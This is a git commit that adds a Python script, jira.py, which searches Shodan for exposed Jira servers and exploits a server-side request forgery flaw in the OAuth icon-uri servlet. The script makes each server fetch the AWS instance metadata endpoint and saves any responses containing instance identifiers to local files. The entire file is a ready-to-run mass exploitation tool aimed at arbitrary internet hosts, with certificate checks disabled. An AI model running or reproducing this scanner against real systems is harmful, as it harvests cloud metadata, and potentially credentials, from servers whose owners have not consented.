3e657aaabf207a6b1dbda0b865acd28063e6bae0
Robbie <txt3rob@gmail.com>
2018-04-18 14:13:56 +0100

    test

---
+++ Jira/jira.py
@@ -0,0 +1,78 @@
+#!/usr/bin/env python
+#
+# jira.py
+# Search SHODAN for JIRA SSRF
+#
+# Author: random_robbie
+
+import shodan
+import sys
+import re
+import requests
+from time import sleep
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+# Configuration
+API_KEY = "YOURAPIKEY"
+SEARCH_FOR = 'http.component:jira'
+FILE = "/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/"
+session = requests.Session()
+
+def filter_result(str):
+	str.strip() #trim
+	str.lstrip() #ltrim
+	str.rstrip() #rtrim
+	return str
+
+def grab_file (IP,PORT,FILE):
+	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
+	try:
+		
+		URL = "https://"+IP+":"+PORT+""+FILE+""
+		
+		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
+		response = session.get(URL, headers=headers, timeout=15, verify=False)
+		result = response.text
+		if 'ami-id' in result:
+			if "instance-id" in result:
+				text_file = open("./cfg/"+IP+"-jira.cfg", "a")
+				text_file.write(""+result+"\n")
+				text_file.close()
+				print ("[*] Jira... Found [*]\n")
+				print (result)
+		else:
+			print ("[*] Not Vulnerable [*]\n ")
+	except KeyboardInterrupt:
+		print ("Ctrl-c pressed ...")
+		sys.exit(1)
+			
+	except Exception as e:
+		print (e)
+		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
+	
+
+
+
+	
+	
+try:
+        # Setup the api
+		api = shodan.Shodan(API_KEY)
+
+        # Perform the search
+		result = api.search(SEARCH_FOR)
+
+        # Loop through the matches and print each IP
+		for service in result['matches']:
+				IP = service['ip_str']
+				PORT = str(service['port'])
+				CC = service['location']['country_name']
+				grab_file (IP,PORT,FILE)
+except KeyboardInterrupt:
+		print ("Ctrl-c pressed ...")
+		sys.exit(1)
+				
+except Exception as e:
+		print('Error: %s' % e)
+		sys.exit(1)
